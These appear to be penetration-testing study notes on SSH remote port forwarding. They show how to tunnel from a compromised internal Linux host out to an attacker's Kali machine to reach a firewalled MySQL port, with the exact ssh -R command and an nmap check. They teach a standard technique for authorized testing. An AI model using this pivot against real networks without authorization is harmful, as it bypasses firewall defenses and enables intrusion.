Aka "Reverse Port Forwarding".

In this situation, a port is opened on the REMOTE side of the connectino and traffic sent to that port is forwarded to a port on our local machine, which is initiating the SSH client. 

Connections to the TCP on the remote host will be forwarded to a specific port on the local machine. 

### Scenario
Access to a non-root shell on a Linux Client on the internal network. There is a MySQL server running on TCP 3306. 

This time, there is a firewall blockign inbound TCP 22 (SSH) connections, so we can't SSH into this sever from our internet connected Kali machine. 

However, we can SSH OUT to our Kali machine, since outbound TCP is allowed through the firewall. 

We can use SSH Remote/Reverse (**ssh -R**) port forwarding to open a port on the Kali machine that forwards traffic to the MySQL TCP 3306 port on the internal server. All traffic will traverse an SSH tunnel through the firewall. 

***
SSH port forwards can be run as NON-ROOT users as long as we only bind unused non-privileged local ports (above 1024).
***

### Execution

Syntax:
`ssh -N -R [bind_address:]port:host:hostport [username@address]`

Kali>
`ssh -N -R 10.11.0.4:2221:127.0.0.1:3306 kali@10.11.0.4`
**-N** no commands
**-R** Remote forward
**10.11.0.4:2221** Open up a listener on TCP 2221 on Kali
**127.0.0.1:3306** Foward connections to internal Linux TCP 3306

This will forward all incoming traffic on our Kali's local port 2221 to port 3306 on the compormised box through an SSH tunnel, allowing us to reach the MySQL port even though it's filtered by the firewall. 
![3c6231cc20e10a1a962ca8421a09da8c.png](../../../../../_resources/3c6231cc20e10a1a962ca8421a09da8c.png)

### Testing

With the tunnel up, we can switch to our Kali machine and validate that TCP 2221 is listening:
`ss -antp | grep "2221"`

Scan the localhost on that port with nmap:
`sudo nmap -sS -sV 127.0.0.1 -p 2221`


